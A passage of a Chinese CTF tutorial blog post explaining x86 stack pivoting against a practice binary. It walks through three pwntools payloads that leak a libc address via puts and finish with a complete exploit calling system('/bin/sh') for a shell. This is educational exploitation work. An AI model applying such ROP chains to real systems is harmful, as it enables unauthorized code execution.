+<p>从伪代码中的read(0, &amp;buf, 0x40u);，read函数可以读取0x40的内容放到buf（0x28）中，也就是说我们只能控制0x40-0x28&#x3D;0x18（24）的内容，再加之上我们的payload需要泄露libc文件得到system的地址，这些空间未免也太少了吧，所以我们只能进行栈迁移。</p>
+<h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h2><p>我们先来看一下payload1：</p>
+<blockquote>
+<p>payload1&#x3D;’a’*(0x28)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf)+p32(0x100)</p>
+</blockquote>
+<p>使用payload填充栈的情况如下：（<strong><span style="color: #F5222D">注：以下图片均为指令执行后的结果</span></strong>）</p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597664624666-032a5557-5dbf-4ce7-a8b4-d1734dc55b22.png" alt="QQ截图20200817194331.png"></p>
+<p>注意，我们read函数覆盖的是main函数的返回地址，因此程序会先执行main函数结尾的leave和ret指令</p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597664928902-93b799df-14fd-4e08-bd7f-ee8851a2e9df.png" alt="QQ截图20200817194842.png"></p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597665034362-97e73b1a-0195-465c-ab68-03a1c19e1c23.png" alt="QQ截图20200817195020.png"></p>
+<p>这个时候程序会开始执行read函数，因为eip指向了read_plt，如下图所示：</p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597665305032-4e88b4e7-3269-4caf-b388-cf3364b74f08.png" alt="QQ截图20200817195456.png"></p>
+<p>read函数执行完了，那就执行我们的gadgets：leave_ret</p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597665418026-13454bfe-e413-442f-a7ec-aa2f9633fe34.png" alt="QQ截图20200817195633.png"><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597665418812-5dc715ee-9409-482c-af7d-4ac5f93c5846.png" alt="QQ截图20200817195645.png"></p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597665949200-484d7610-aa38-41fe-bfe4-a9762a5bd3b4.png" alt="QQ截图20200817200537.png"></p>
+<p>第一部分payload完整的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib32/libc.so.6&#x27;</span>)<span class="comment">#本地libc文件</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span>  </span><br><span class="line"></span><br><span class="line">buf=elf.bss()+<span class="number">0x500</span></span><br><span class="line">buf1=elf.bss()+<span class="number">0x400</span></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0x08048418</span></span><br><span class="line"><span class="comment"># 0x08048418 : leave ; ret</span></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Try your best :\n&#x27;</span>,payload1)</span><br><span class="line">gdb.attach(p) <span class="comment">#附加gdb进行调试</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>我们对应gdb看一下执行payload完之后栈的情况：</p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597554683150-67b5f464-97c6-4a39-ba34-27421bebc109.png" alt="QQ截图20200816124125.png"></p>
+<p>注意：由于有read函数的存在，此时的gadgets：leave_ret并没有执行，而是等待我们的输入payload2，IDA如下：</p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597554434211-bb28751d-5b40-4498-9461-699f17a91c16.png" alt="QQ截图20200816130705.png"></p>
+<p>此时的寄存器状况如下：<strong><span style="color: #F5222D"></span></strong></p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597554281776-eba14176-300a-4cb9-8355-409528af6fcc.png" alt="QQ截图20200816130406.png"></p>
+<blockquote>
+<p>注意：执行payload1时，发生了栈转移</p>
+</blockquote>
+<h2 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h2><p>我们继续看一下payload2：</p>
+<blockquote>
+<p>payload2&#x3D;p32(buf1)+p32(puts_plt)+p32(pop1ret)+p32(puts_got)<br>payload2+&#x3D;p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf1)+p32(0x100)</p>
+</blockquote>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597666011321-177eb735-d41b-44d9-b119-4d1655c7e4e6.png" alt="QQ截图20200817200643.png"></p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597666092466-df875db3-ce5d-48b7-8c4f-018baacbd3a5.png" alt="QQ截图20200817200805.png"></p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597666113649-e46600c7-c31b-4f50-a7eb-953e5c8ab1e0.png" alt="QQ截图20200817200825.png"></p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597666144820-7593cb3c-6c38-49dd-bd39-a8e66cf3d57d.png" alt="QQ截图20200817200857.png"></p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597666174208-88a18171-2a5e-44da-9ad1-e94c46e0af29.png" alt="QQ截图20200817200925.png"></p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597666200392-ee0738f5-b95c-46d1-ad4e-24c3aecd6226.png" alt="QQ截图20200817200953.png"></p>
+<p>在payload1中，我们调用了read函数读入了payload2，然后read函数的使命完成。执行leave_ret：（leave）先将mov esp,ebp;  pop ebp（将buf1的地址赋值给ebp，设置为新的栈底），（ret）之后pop eip将put_plt地址赋值给eip（或者说是将返回地址覆盖为put_plt地址），此时程序就会执行put函数，put_plt的参数为puts_got，这样就可以使用puts函数打印出puts函数在内存中的真实地址（puts(puts_got)），使用read_plt将puts的返回地址覆盖，为下一次栈转移做准备；然后计算出libc基址最后就可以得到system和’&#x2F;bin&#x2F;sh’在内存中的地址并利用它。</p>
+<p>这里的 pop1ret 的作用呢。其实就是把 p32(puts_got) 给从栈中取出（这里只要有ret指令就行，是为了平衡堆栈），进而实现接下来执行  read_plt(0,buf,0x100) 函数构造最后的攻击代码，即我们的payload_3。</p>
+<p>第二部分完整的payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib32/libc.so.6&#x27;</span>)<span class="comment">#本地libc文件</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span>  </span><br><span class="line"></span><br><span class="line">buf=elf.bss()+<span class="number">0x500</span></span><br><span class="line">buf1=elf.bss()+<span class="number">0x400</span></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0x08048418</span></span><br><span class="line"><span class="comment"># 0x08048418 : leave ; ret</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Try your best :\n&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop1ret=<span class="number">0x0804836d</span></span><br><span class="line"><span class="comment"># 0x0804836d : pop ebx ; ret</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2=p32(buf1)+p32(puts_plt)+p32(pop1ret)+p32(puts_got)</span><br><span class="line">payload2+=p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf1)+p32(<span class="number">0x100</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>附：这个程序可以利用的gadget：</p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597568376601-fce4b40e-96fa-4d49-b036-a43ee0c0ee5a.png" alt="QQ截图20200816165922.png"></p>
+<hr>
+<p>看一下执行完payload2的栈与寄存器的情况：</p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597571970676-682e386b-b72a-4782-891d-bcbe99826c1d.png" alt="QQ截图20200816175904.png"><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597571971831-b609b082-851d-448c-9903-e0ba51e4330f.png" alt="QQ截图20200816175918.png"></p>
+<blockquote>
+<p>payload2执行时又发生了一次栈转移</p>
+</blockquote>
+<h2 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h2><p>继续看payload3：</p>
+<p>payload3&#x3D;p32(buf)+p32(read_plt)+p32(pop3ret)+p32(0)+p32(buf)+p32(0x100)</p>
+<p>payload3+&#x3D;p32(system_addr)+p32(0xdeadbeef)+p32(buf)</p>
+<p>p.sendline(payload3)</p>
+<p>p.sendline(“&#x2F;bin&#x2F;sh\x00”)</p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597666290105-772bc0d9-f886-427a-9588-765541bedb2d.png" alt="QQ截图20200817201122.png"></p>
+<p><img src="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597666394511-21937330-1513-4db4-88fe-72b7b0d32f37.png" alt="QQ截图20200817201303.png"></p>
+<p>getshell！</p>
+<p>完整exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span>  </span><br><span class="line"></span><br><span class="line">buf=elf.bss()+<span class="number">0x500</span></span><br><span class="line">buf1=elf.bss()+<span class="number">0x400</span></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0x08048418</span></span><br><span class="line"><span class="comment"># 0x08048418 : leave ; ret</span></span><br><span class="line"></span><br><span class="line">pay1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p32(buf)</span><br><span class="line">pay1+=p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Try your best :\n&#x27;</span>,pay1)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop1ret=<span class="number">0x0804836d</span></span><br><span class="line"><span class="comment"># 0x0804836d : pop ebx ; ret</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pay2=p32(buf1)+p32(puts_plt)+p32(pop1ret)+p32(puts_got)</span><br><span class="line">pay2+=p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf1)+p32(<span class="number">0x100</span>)</span><br><span class="line">io.sendline(pay2)</span><br><span class="line"></span><br><span class="line">puts_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="string">&quot;puts_addr = &quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libcbase=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop3ret=<span class="number">0x08048569</span></span><br><span class="line"><span class="comment"># 0x08048569 : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pay3=p32(buf)+p32(read_plt)+p32(pop3ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">pay3+=p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(buf)</span><br><span class="line">io.sendline(pay3)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><a href="/assets/posts/pwn-2-2-1-x86-1nm90/assets/1597666851339-a037d8ed-7306-481f-9fa4-4a87f058664f.xlsx">栈转移分步图解.xlsx</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-2-1%EF%BC%89-%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%88x86%EF%BC%89/">https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-2-1%EF%BC%89-%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%88x86%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://elydemiurge.github.io" target="_blank">Cyberangel's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://picsum.photos/seed/blog-cover-08/800/450" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-1-4%EF%BC%89-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%EF%BC%88x64%EF%BC%89/" title="PWN入门（2-1-4）-格式化字符串漏洞（x64）"><img class="cover" src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">PWN入门（2-1-4）-格式化字符串漏洞（x64）</div></div><div class="info-2"><div class="info-item-1">PWN入门（2-1-4）-格式化字符串漏洞（x64） 参考资料：https://blog.csdn.net/qq_41202237&#x2F;article&#x2F;details&#x2F;107833668附件：链接：https://pan.baidu.com/s/1OirvvldAGdjwqeARI6pYPg提取码：9yhw  前言64位格式化字符串和32位的很相似，做题的步骤也相同，唯一不同的是64位程序对函数参数存储的方式和32位的不同。64为程序会优先将函数的前6个参数放置在寄存器中，超过6个的再存放在栈上，而32位直接存放在栈上。 示例将文件下载下来，检查一下保护：  开启了NX保护和Canary保护，但是这里用到的是格式化字符串漏洞，不需要栈溢出，不需要在栈上部署shellcode开启这两个保护对漏洞没什么影响。 运行一下程序：  在运行程序之前，请在同目录下创建一个flag.txt文件，并在文件之中填上内容我填充的是flag{wow_you_pwn_me}   将文件载入IDA中，查看伪代码：  从上图中可以看到，红箭头处并没有格式化字符串，因此这里存在格式化...</div></div></div></a><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-1-5%EF%BC%89-%E4%BD%BF%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87Canary%E4%BF%9D%E6%8A%A4%EF%BC%8832%E4%BD%8DELF%EF%BC%89/" title="PWN入门（2-1-5）-使用格式化字符串漏洞绕过Canary保护（32位ELF）"><img class="cover" src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">PWN入门（2-1-5）-使用格式化字符串漏洞绕过Canary保护（32位ELF）</div></div><div class="info-2"><div class="info-item-1">PWN入门（2-1-5）-使用格式化字符串漏洞绕过Canary保护（32位ELF） 题目来源自：https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/61参考资料：http://www.xiyblogs.cn/2020/02/24/%E7%9C%8B%E6%88%91%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E7%BB%95canary%EF%BC%8C%E6%8B%BFshell/附件下载：链接：https://pan.baidu.com/s/1hVMiXkKJQoiEbYMpPJfsAg提取码：4egx  将文件下载下来之后，检查一下文件的保护机制：  可以知道，这是一个32位的文件，开启了NX和Canary保护。  Canary简介：Canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs&#x2F;gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上（最低位都是\x00），当函数结束时会检查这个栈上的值是否和存进去的值一致，若一致则正常退出，如果是...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cyberangel</div><div class="author-info-description">二进制安全</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElyDemiurge"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElyDemiurge" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:elydemiurge@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">从语雀迁移博客到 Github</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%85%A5%E9%97%A8%EF%BC%882-2-1%EF%BC%89-%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%88x86%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">PWN入门（2-2-1）-栈迁移（x86）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8D%E7%A8%8B%E5%BA%8F-%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">1.3.</span> <span class="toc-text">32位程序 栈迁移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload1"><span class="toc-number">1.4.</span> <span class="toc-text">payload1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload2"><span class="toc-number">1.5.</span> <span class="toc-text">payload2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload3"><span class="toc-number">1.6.</span> <span class="toc-text">payload3</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"><img src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南">《IoT从入门到入土》(11)--IoT靶场环境docker封装指南</a><time datetime="2022-12-08T00:19:26.000Z" title="发表于 2022-12-08 08:19:26">2022-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"><img src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）">《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）</a><time datetime="2022-11-25T01:47:22.000Z" title="发表于 2022-11-25 09:47:22">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"><img src="https://picsum.photos/seed/blog-cover-08/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建">《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建</a><time datetime="2022-11-21T02:38:00.000Z" title="发表于 2022-11-21 10:38:00">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"><img src="https://picsum.photos/seed/blog-cover-01/800/450" 